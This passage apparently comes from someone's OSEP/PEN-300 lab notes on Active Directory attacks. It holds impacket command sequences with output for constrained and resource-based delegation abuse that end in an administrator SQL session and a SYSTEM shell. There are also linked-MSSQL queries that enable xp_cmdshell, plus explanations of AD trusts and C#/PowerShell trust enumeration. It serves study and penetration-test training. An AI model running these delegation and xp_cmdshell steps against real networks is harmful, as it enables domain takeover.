   ```

6. **Use the ticket** to access services like **CIFS**, **HTTP**, or others on behalf of the impersonated user.

   ```powershell
   net use \\TargetServer\ShareName
   ```

---

### **Important Notes**

- **Constrained Delegation** is configured in the **`msDS-AllowedToDelegateTo`** property and should be carefully monitored and limited to minimize security risks.
- **Rubeus** and tools like **Mimikatz** can be used to abuse this feature, so proper security controls, logging, and monitoring are essential.
- **Constrained delegation** should be used with **resource-based delegation** (available in newer versions of Windows) for better control over delegation.

By using these techniques, attackers can escalate privileges by impersonating privileged users and accessing sensitive services within the network.

```bash
impacket-getTGT -dc-ip 192.168.215.70 -service prod.corp1.com/iissvc -hashes :2892D26CDF84D7A70E2EB3B9F05C425E prod.corp1.com/offsec

export KRB5CCNAME=/home/roger/Documents/OSEP/Pen300/16ActiveDirectoryExploitation/16.2/iissvc.ccache

impacket-getST -dc-ip 192.168.215.70 -k  -impersonate administrator -spn MSSQLSvc/cdc01.prod.corp1.com:1433 prod.corp1.com/iissvc


impacket-mssqlclient -k -no-pass -dc-ip 192.168.215.70 -target-ip 192.168.215.70 prod.corp1.com/administrator@cdc01.prod.corp1.com
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(CDC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(CDC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (PROD\Administrator  dbo@master)> select suser_name();

------------------
PROD\Administrator

SQL (PROD\Administrator  dbo@master)> select system_user;

------------------
PROD\Administrator


```

```bash
impacket-addcomputer -method SAMR -computer-name secret$ -dc-ip 192.168.215.70 -dc-host prod.corp1.com prod.corp1.com/dave:lab
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Successfully added machine account secret$ with password svreOyjgFaZFLAenQgj0xHpRCwCJiQVT.

impacket-rbcd -delegate-to 'appsrv01$' -delegate-from 'secret$' -dc-ip 192.168.215.70 -action write prod.corp1.com/dave:lab
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] secret$ can now impersonate users on appsrv01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     secret$      (S-1-5-21-634106289-3621871093-708134407-3601)

impacket-getST -spn CIFS/appsrv01.prod.corp1.com -impersonate administrator -dc-ip 192.168.215.70 -force-forwardable -hashes :3CBF1E00EB03FD41AC65852CB5C60D93 'prod.corp1.com/secret3$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*]     Forcing the service ticket to be forwardable
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@CIFS_appsrv01.prod.corp1.com@PROD.CORP1.COM.ccache

export KRB5CCNAME=administrator@CIFS_appsrv01.prod.corp1.com@PROD.CORP1.COM.ccache

❯ impacket-psexec -k -no-pass -dc-ip 192.168.215.70 -target-ip 192.168.215.75 prod.corp1.com/administrator@appsrv01.prod.corp1.com
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 192.168.215.75.....
[*] Found writable share ADMIN$
[*] Uploading file VvKzGksL.exe
[*] Opening SVCManager on 192.168.215.75.....
[*] Creating service gbvY on 192.168.215.75.....
[*] Starting service gbvY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
appsrv01

```

## AD Forests

### Active Directory (AD) Trusts and Forests

#### **1. Active Directory Forests**
- **Forest**: A collection of **domains** that share the same AD schema, configuration, and Global Catalog. The **forest** is the top-level container in an AD environment. All domains in the forest have access to resources within the forest, subject to permissions.
  - **Domain**: A logical grouping of network objects (like users, computers, and groups) that share a common database. Each domain has its own security policies but can share trust relationships with other domains in the forest.

#### **2. Active Directory Trusts**
**Trusts** are relationships established between two AD domains or forests that allow users in one domain or forest to access resources in another. Trusts facilitate communication and access across domain boundaries. Trusts can be either **transitive** or **non-transitive**, and can operate in **one-way** or **two-way** configurations.

##### **Types of Trusts**:

1. **Parent-Child Trust**:
   - Created automatically when a new domain is added to an existing domain tree.
   - **Transitive** and **two-way**.

2. **Tree-Root Trust**:
   - Created automatically between the root domains of two AD trees in the same forest.
   - **Transitive** and **two-way**.

3. **External Trust**:
   - Created manually between domains in different forests or between an AD domain and an older NT domain.
   - **Non-transitive** and can be **one-way** or **two-way**.

4. **Forest Trust**:
   - Manually created between the root domains of two separate AD forests.
   - **Transitive** and can be **one-way** or **two-way**.

5. **Realm Trust**:
   - Created between an AD domain and a **Kerberos** realm (such as in a Unix environment).
   - Can be **transitive** or **non-transitive**, and **one-way** or **two-way**.

6. **Shortcut Trust**:
   - Manually created to improve authentication performance between domains in different parts of the same forest.
   - **Transitive** and can be **one-way** or **two-way**.

#### **3. Transitive Trusts**
- **Transitive Trusts**: A trust is considered **transitive** if access rights can be "inherited" through the trust. For example, if Domain A trusts Domain B, and Domain B trusts Domain C, then Domain A automatically trusts Domain C. This is especially useful in multi-domain forests, as it allows for efficient access control without having to establish individual trusts between every domain.
- Most AD trusts, except for **External Trusts**, are **transitive**.

### AD Trust Enumeration

**Enumeration** of AD trusts can help attackers understand the scope of the environment, identify which domains trust each other, and how access flows across the network. Trust enumeration is crucial during lateral movement and privilege escalation.

#### **Key Techniques for Enumerating Trusts**:

1. **Built-in Tools**:
   - **nltest**: A command-line tool used to query and enumerate trust relationships.
     ```bash
     nltest /domain_trusts
     nltest /trusted_domains
     nltest /dclist:<DomainName>
     ```
   - **netdom**: Another built-in tool for managing domain trusts.
     ```bash
     netdom trust <YourDomain> /domain:<OtherDomain> /verify
     ```

2. **PowerShell**:
   - Using PowerShell to enumerate trusts:
     ```powershell
     Get-ADTrust -Filter * | Select-Object Name, Source, Target, TrustType, TrustDirection
     ```

3. **BloodHound**:
   - **BloodHound** is a tool commonly used for AD enumeration. It collects trust relationships and provides an interactive graph for analyzing attack paths.
     - Trusts can be visualized to determine transitive relationships between domains and forests.

### Important Default Users in Active Directory

| **Default User**   | **Description**                                                    | **Misconfiguration Risks**                                                                                                                                                    |
|--------------------|--------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Administrator**  | The default built-in account with full domain administrative rights | If the password is weak or shared, attackers can obtain domain-wide administrative privileges. Disabling or renaming the account can mitigate some risks.                        |
| **Guest**          | A default account with very limited permissions                    | By default, this account is disabled. If enabled and poorly managed, it could give unauthorized users access to the domain with low-level privileges.                            |
| **krbtgt**         | Kerberos Ticket Granting Ticket account                            | Attackers can misuse the **krbtgt** account to forge Kerberos tickets (e.g., in **Golden Ticket** attacks). Changing the password regularly can mitigate this risk.              |
| **DefaultAccount** | A low-privilege account, mostly used for system purposes            | This account should have minimal permissions. Misconfigurations or enabling it could provide a foothold for attackers.                                                          |
| **Domain Admins**  | A global group for accounts with administrative access across the domain | If an attacker compromises an account in this group, they gain full domain control. Limit membership and enforce strict password policies to reduce risk.                        |
| **Enterprise Admins** | A global group for forest-level administrative tasks              | An attacker with access to this group can control the entire forest. Avoid adding unnecessary users, and limit the use of this group to critical tasks.                          |
| **Backup Operators** | Can back up and restore files, even those they don't have access to | Misconfiguring this group can allow attackers to back up sensitive files and restore them in a location they control, bypassing access control.                                   |
| **Schema Admins**  | Can make changes to the AD schema                                  | Modifying the schema is dangerous and should only be done by experienced administrators. Any account in this group has the ability to affect the entire forest configuration.     |
| **DnsAdmins**      | Can administer DNS servers in AD                                   | Misconfigurations in the **DnsAdmins** group can lead to privilege escalation. Attackers could use this to execute arbitrary code by exploiting DNS server settings.             |

### Misconfigurations Leading to Exploitation

1. **Weak or Shared Passwords**:
   - Accounts like **Administrator** or **krbtgt** are highly privileged. If they have weak or default passwords, they become prime targets for brute-force attacks or credential stuffing.
   
2. **Unused or Enabled Guest Accounts**:
   - Leaving the **Guest** account enabled with default configurations or weak permissions can provide attackers with a low-privilege entry point.

3. **Over-privileged Users or Groups**:
   - Placing unnecessary accounts in powerful groups like **Domain Admins** or **Enterprise Admins** increases the risk. If these accounts are compromised, the attacker gets broad control over the domain or forest.

4. **Failure to Rotate the `krbtgt` Password**:
   - **Golden Ticket** attacks leverage the **krbtgt** account to forge Kerberos tickets. Regularly rotating the **krbtgt** password reduces the window of opportunity for attackers to misuse a compromised ticket-granting service.

5. **Trust Relationships**:
   - Misconfigured **transitive trusts** can allow attackers to pivot across domains and forests. If domain A trusts domain B, and domain B trusts domain C, attackers in domain C could potentially gain access to domain A.

6. **Privileged Groups Like `DnsAdmins` and `Backup Operators`**:
   - Exploiting the **DnsAdmins** group, attackers can execute code on a DNS server. Similarly, **Backup Operators** can misuse backup privileges to copy sensitive data or restore it in locations they control.

### AD Exploitation Techniques Related to Trusts and Users

1. **Abusing Transitive Trusts**:
   - If transitive trusts exist, attackers can compromise low-privileged accounts in a less secure domain and move laterally into more privileged domains.
   - Attackers can use **Pass-the-Ticket** or **Pass-the-Hash** attacks to traverse domains and forests when trusts are present.

2. **Golden Ticket Attack**:
   - Once the **krbtgt** account is compromised, attackers can forge tickets that grant domain-wide or forest-wide privileges, allowing unrestricted access for an extended period.

3. **Silver Ticket Attack**:
   - Exploiting service tickets by compromising accounts with service privileges (like **DnsAdmins**) and creating fake service tickets to perform unauthorized actions.

4. **Pass-the-Hash**:
   - Attackers use an NTLM hash to authenticate as a user without needing the actual password. If a privileged user's hash is available, it can be reused to authenticate across the network.

---

In conclusion, **Active Directory trusts** allow for resource sharing across domains and forests but can introduce security risks if misconfigured. Proper enumeration and understanding of trust relationships are essential for both securing the environment and for attackers seeking to exploit it. Misconfigurations in **default user accounts** and **privileged groups** are common vectors for exploitation, and organizations need to enforce strict policies, monitor changes, and regularly audit these accounts and their privileges to avoid compromise.

To enumerate domain trusts using .NET, Win32 API, and LDAP, you can leverage different approaches for querying the domain trust relationships. Below are examples for each method:

### 1. **Using .NET and System.DirectoryServices (LDAP)**

The .NET framework allows you to use the `System.DirectoryServices` namespace to query Active Directory for trust relationships. This approach uses LDAP to retrieve the necessary information.

#### Example .NET Code for LDAP-based Enumeration

```csharp
using System;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;

class DomainTrustEnumeration
{
    static void Main()
    {
        try
        {
            // Get the current domain
            Domain currentDomain = Domain.GetCurrentDomain();

            // Enumerate the domain trusts
            foreach (TrustRelationshipInformation trust in currentDomain.GetAllTrustRelationships())
            {
                Console.WriteLine("Trusted Domain: " + trust.TargetName);
                Console.WriteLine("Trust Direction: " + trust.TrustDirection);
                Console.WriteLine("Trust Type: " + trust.TrustType);
                Console.WriteLine("Trust Attributes: " + trust.TrustAttributes);
                Console.WriteLine("------------------------------");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }
}
```

#### Explanation:
- `Domain.GetCurrentDomain()` retrieves the current Active Directory domain.
- `GetAllTrustRelationships()` retrieves all trust relationships that the current domain has with other domains.
- This method returns `TrustRelationshipInformation` objects containing the name of the trusted domain, trust direction, and trust type.

### 2. **Using Win32 API (NetAPI)**

The Win32 API provides functions like `NetGetDCName`, `NetGetAnyDCName`, and `DsEnumerateDomainTrusts` to enumerate domain trusts programmatically.

#### Example C# Code Using P/Invoke and Win32 API

To use `DsEnumerateDomainTrusts`, you need to import the function using P/Invoke:

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    // P/Invoke declaration for DsEnumerateDomainTrusts function
    [DllImport("Netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int DsEnumerateDomainTrusts(
        string serverName,
        uint flags,
        out IntPtr domains,
        out uint domainCount);

    [StructLayout(LayoutKind.Sequential)]
    public struct DS_DOMAIN_TRUSTS
    {
        public string NetbiosDomainName;
        public string DnsDomainName;
        public uint Flags;
        public uint ParentIndex;
        public uint TrustType;
        public uint TrustAttributes;
        public IntPtr DomainSid;
        public Guid DomainGuid;
    }

    const uint DS_DOMAIN_IN_FOREST = 0x0001;
    const uint DS_DOMAIN_DIRECT_OUTBOUND = 0x0002;
    const uint DS_DOMAIN_TREE_ROOT = 0x0004;

    static void Main()
    {
        IntPtr domainsPtr = IntPtr.Zero;
        uint domainCount;

        int result = DsEnumerateDomainTrusts(null, DS_DOMAIN_IN_FOREST, out domainsPtr, out domainCount);

        if (result == 0 && domainsPtr != IntPtr.Zero)
        {
            DS_DOMAIN_TRUSTS[] domainTrusts = new DS_DOMAIN_TRUSTS[domainCount];
            IntPtr currentDomainPtr = domainsPtr;

            for (int i = 0; i < domainCount; i++)
            {
                domainTrusts[i] = Marshal.PtrToStructure<DS_DOMAIN_TRUSTS>(currentDomainPtr);
                currentDomainPtr = IntPtr.Add(currentDomainPtr, Marshal.SizeOf<DS_DOMAIN_TRUSTS>());

                Console.WriteLine($"NetbiosDomainName: {domainTrusts[i].NetbiosDomainName}");
                Console.WriteLine($"DnsDomainName: {domainTrusts[i].DnsDomainName}");
                Console.WriteLine($"TrustType: {domainTrusts[i].TrustType}");
                Console.WriteLine($"TrustAttributes: {domainTrusts[i].TrustAttributes}");
                Console.WriteLine("----------------------------");
            }

            // Free the memory allocated for the domain structures
            Marshal.FreeHGlobal(domainsPtr);
        }
        else
        {
            Console.WriteLine("Error enumerating domain trusts.");
        }
    }
}
```

#### Explanation:
- `DsEnumerateDomainTrusts` is a Win32 API function that retrieves information about domain trust relationships.
- The `DS_DOMAIN_TRUSTS` structure contains details about each trust, including the domain name, trust type, and trust attributes.
- You pass `null` to `DsEnumerateDomainTrusts` to query the local machine's domain.

### 3. **Using LDAP Directly with .NET**

You can directly query LDAP to retrieve domain trust information by performing an LDAP query against the `trustedDomain` object class in Active Directory.

#### Example Code for LDAP Query

```csharp
using System;
using System.DirectoryServices;

class LDAPTrustEnumeration
{
    static void Main()
    {
        try
        {
            string ldapPath = "LDAP://DC=domain,DC=com"; // Change to your domain
            DirectoryEntry entry = new DirectoryEntry(ldapPath);
            DirectorySearcher searcher = new DirectorySearcher(entry);

            searcher.Filter = "(objectClass=trustedDomain)";
            searcher.PropertiesToLoad.Add("cn");
            searcher.PropertiesToLoad.Add("trustDirection");
            searcher.PropertiesToLoad.Add("trustType");
            searcher.PropertiesToLoad.Add("trustAttributes");

            foreach (SearchResult result in searcher.FindAll())
            {
                Console.WriteLine("Trusted Domain: " + result.Properties["cn"][0]);
                Console.WriteLine("Trust Direction: " + result.Properties["trustDirection"][0]);
                Console.WriteLine("Trust Type: " + result.Properties["trustType"][0]);
                Console.WriteLine("Trust Attributes: " + result.Properties["trustAttributes"][0]);
                Console.WriteLine("------------------------------");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }
}
```

#### Explanation:
- The LDAP query filters for `trustedDomain` objects, which store information about domain trusts.
- The `DirectorySearcher` retrieves attributes such as `trustDirection`, `trustType`, and `trustAttributes`.

### Summary

| **Method**           | **Approach**                                       | **Tools/Technologies**                                    | **Pros**                                                     |
|----------------------|----------------------------------------------------|-----------------------------------------------------------|--------------------------------------------------------------|
| **.NET with LDAP**    | Uses `System.DirectoryServices` to query trusts.  | .NET, System.DirectoryServices, Active Directory API       | Easy to use, access to rich Active Directory data.            |
| **Win32 API**         | Uses `DsEnumerateDomainTrusts` function via P/Invoke. | C#, Win32 API (NetAPI)                                     | Direct interaction with Windows API, flexible and powerful.   |
| **LDAP Query**        | Direct LDAP query using .NET.                      | .NET, System.DirectoryServices, LDAP                       | Simple, LDAP-based approach for querying domain objects.       |

Each method has its use case depending on what you're trying to achieve and your familiarity with the tools. You can use any of the above to enumerate domain trusts within an Active Directory environment.


Yes, you can easily enumerate domain trusts using PowerShell without the need to create C# code. PowerShell has built-in cmdlets and .NET integration that can access Active Directory information directly.

Here are a couple of methods to achieve this using PowerShell:

### 1. **Using PowerShell and the `Get-ADTrust` Cmdlet**

If you have the **Active Directory module** installed (which comes with the RSAT tools or can be installed on Domain Controllers), you can use `Get-ADTrust` to enumerate domain trusts.

#### Example Command:
```powershell
# This command gets all the trust relationships for the current domain
Get-ADTrust -Filter *
```

#### Explanation:
- This command retrieves all trust relationships for the domain you're currently connected to.
- You can also specify particular domains or filter for specific trust types or attributes.

#### Example with Filtering:
```powershell
# Get all trusts where the target domain is trusted
Get-ADTrust -Filter {Direction -eq 'Inbound'}
```

### 2. **Using PowerShell and `Get-WmiObject` with Win32 API**

You can query domain trust relationships via the `Win32_Trustee` and `Win32_Trust` classes with `Get-WmiObject`.

#### Example Command:
```powershell
# Query domain trusts using WMI
Get-WmiObject -Class Win32_Trustee -Namespace "ROOT\Microsoft\Windows\Trust"
```

This will output all the trust relationships, though `Get-ADTrust` is generally easier to use and provides more comprehensive information.

### 3. **Using .NET Classes in PowerShell**

You can also leverage .NET classes directly from PowerShell to enumerate domain trusts. This is similar to the C# approach but done entirely in PowerShell.

#### Example Command:
```powershell
# Load the .NET assembly for Active Directory
Add-Type -AssemblyName System.DirectoryServices

# Get the current domain
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Enumerate all trust relationships
$domain.GetAllTrustRelationships() | ForEach-Object {
    Write-Host "Trusted Domain: $($_.TargetName)"
    Write-Host "Trust Direction: $($_.TrustDirection)"
    Write-Host "Trust Type: $($_.TrustType)"
    Write-Host "------------------------------"
}
```

#### Explanation:
- This uses the same .NET classes that the C# code does, but with PowerShell.
- `GetCurrentDomain()` retrieves the domain you're currently connected to.
- `GetAllTrustRelationships()` lists all the trust relationships the current domain has.

### 4. **Using LDAP Queries with PowerShell**

If you prefer to query Active Directory using LDAP, you can do so with `System.DirectoryServices.DirectorySearcher` in PowerShell.

#### Example Command:
```powershell
# Define the LDAP path
$ldapPath = "LDAP://DC=yourdomain,DC=com"

# Create a directory searcher
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
$searcher.Filter = "(objectClass=trustedDomain)"

# Specify properties to load
$searcher.PropertiesToLoad.AddRange(@("cn", "trustDirection", "trustType", "trustAttributes"))

# Perform the search
$results = $searcher.FindAll()

# Output the results
foreach ($result in $results) {
    $domainName = $result.Properties["cn"][0]
    $trustDirection = $result.Properties["trustDirection"][0]
    $trustType = $result.Properties["trustType"][0]
    $trustAttributes = $result.Properties["trustAttributes"][0]
    
    Write-Host "Trusted Domain: $domainName"
    Write-Host "Trust Direction: $trustDirection"
    Write-Host "Trust Type: $trustType"
    Write-Host "Trust Attributes: $trustAttributes"
    Write-Host "------------------------------"
}
```

### Summary

| **Method**                       | **Approach**                                         | **Tools**                            | **Pros**                                                     |
|-----------------------------------|-----------------------------------------------------|--------------------------------------|--------------------------------------------------------------|
| **PowerShell with Get-ADTrust**   | Uses built-in cmdlet to get domain trust information | Active Directory PowerShell Module   | Easiest and most straightforward method for AD environments   |
| **PowerShell with WMI**           | Queries trust info using WMI objects                | Get-WmiObject                        | Can be used without RSAT or AD module                         |
| **PowerShell with .NET Classes**  | Uses .NET Active Directory classes directly          | .NET in PowerShell                   | Provides fine-grained control over the AD trust enumeration   |
| **PowerShell with LDAP Queries**  | Directly queries trustedDomain objects via LDAP      | System.DirectoryServices in PowerShell | LDAP-based for environments where LDAP is preferable          |

All these methods can be run from PowerShell and provide various ways of retrieving domain trust information depending on what tools you have available. The `Get-ADTrust` method is the simplest and most efficient if you have the Active Directory module installed.


### Linked MSSQL

* single linked
```sql
username
password
mssql01.example.com
master
EXEC sp_linkedservers
select myuser from openquery("mssql.example2.com", 'select system_user as myuser')
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [mssql.example2.com];
EXEC ('EXEC xp_cmdshell ''whoami'';') AT [mssql.example2.com];

```

- Double linked 
```sql
password
mssql.sub.dc.com
master
EXEC sp_linkedservers
select myuser from openquery("rdc01.corp1.com", 'select system_user as myuser')
SELECT * FROM OPENQUERY([dc01.dc2.com], 'EXEC sp_linkedservers');
SELECT * FROM OPENQUERY([mssql.dc.com], 'SELECT IS_SRVROLEMEMBER(''sysadmin'') AS IsSysadmin FROM OPENQUERY([dc01.dc2.com], ''SELECT IS_SRVROLEMEMBER(''''sysadmin'''')'')')
EXECUTE ('EXECUTE (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [dc01.corp2.com]') AT [mssql01.dc.com]
EXEC ('EXEC (''EXEC xp_cmdshell ''''whoami'''';'') AT [dc01.dc2.com]') AT [mssql.dc.com];
```